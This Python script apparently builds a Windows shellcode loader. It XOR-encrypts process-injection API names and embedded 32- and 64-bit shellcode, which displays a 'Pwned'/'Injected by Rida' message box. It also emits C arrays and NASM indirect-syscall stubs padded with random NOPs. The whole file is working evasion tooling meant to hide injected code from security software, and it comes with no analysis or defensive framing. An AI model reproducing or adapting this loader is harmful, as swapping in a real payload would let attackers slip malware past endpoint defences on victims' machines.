from random import randint

def xor(data: bytes, key: bytes) -> bytes:
    klen = len(key)
    return bytes(b ^ key[i % klen] for i, b in enumerate(data))

API_NAMES = [
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtProtectVirtualMemory",
    "NtResumeThread",
    "VirtualFreeEx",
    "VirtualAllocExNuma",
    "NtWaitForSingleObject",
    "NtQueueApcThread"
]
SHELLCODES_32 = bytes.fromhex("fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01c74975ef52578b52108b423c01d08b407885c0744c01d08b582001d38b48185085c9743c498b348b31ff01d631c0acc1cf0d01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5de80b0000007573657233322e646c6c00684c772607ffd56a00e80600000050776e656400e811000000496e6a65637465642062792052696461006a006845835607ffd5bbe01d2a0a68a695bd9dffd583c4283c067c0a80fbe07505bb4713726f6a0053ffd5")
SHELLCODES_64 = bytes.fromhex("fc4881e4f0ffffffe8cc00000041514150524831d2515665488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed52488b522041518b423c4801d0668178180b020f85720000008b80880000004885c074674801d050448b40208b48184901d0e35648ffc9418b34884801d64d31c94831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5de80b0000007573657233322e646c6c005941ba4c772607ffd549c7c100000000e811000000496e6a65637465642062792052696461005ae80600000050776e65640041584831c941ba45835607ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5")

key = b"rzdhop_is_a_nice_guy" 

def to_c_array(data: bytes, varname: str, ctype="UCHAR") -> str:
    hex_vals = ", ".join(f"0x{b:02x}" for b in data)
    return f"{ctype} {varname}[] = {{ {hex_vals} }};"

def unxor_line() :
    for name in API_NAMES :
        print(f"XOR(_{name}, sizeof(_{name}), key, sizeof(key));")

def randNop(f):
    for i in range(randint(0,3)):
        f.write("\tnop\n")

def asm_stubs(fname:str):
    with open(fname, "w") as f:
        f.write(f"; nasm -f win64 {fname} -o {fname.split('.')[0]}.o\n")
        f.write("default rel\n")
        for name in API_NAMES:
            if name.startswith("Nt"):
                f.write(f"extern g_SSN_{name}\n")
                f.write(f"extern g_SYSADDR_{name}\n")
        for name in API_NAMES:
            if name.startswith("Nt"):
                f.write(f"global stub{name}\n")
        f.write("section .text\n")
        for name in API_NAMES:
            if name.startswith("Nt"):
                f.write(f"stub{name}:\n")
                f.write("\txor\teax, eax\n")
                f.write("\tmov\tr10, rcx\n")
                randNop(f)
                f.write(f"\tmov\teax, [g_SSN_{name}]\n")
                randNop(f)
                f.write(f"\tjmp\t[g_SYSADDR_{name}]\n")


for name in API_NAMES:
    enc = xor(name.encode() + b"\x00", key)
    c_name = "_" + name
    print(to_c_array(enc, c_name))

print(to_c_array(xor(SHELLCODES_32, key), "shellcode_32"))
print(to_c_array(xor(SHELLCODES_64, key), "shellcode_64"))

print(to_c_array(key, "key"))

unxor_line()

asm_stubs("masterwizard.asm")

for name in API_NAMES :
    if name.startswith("Nt"):
        print(f"DWORD g_SSN_{name}\t= 0;")
        print(f"LPVOID g_SYSADDR_{name}\t= 0;")
        print(f"extern \"C\" NTSTATUS stub{name}();")
        print()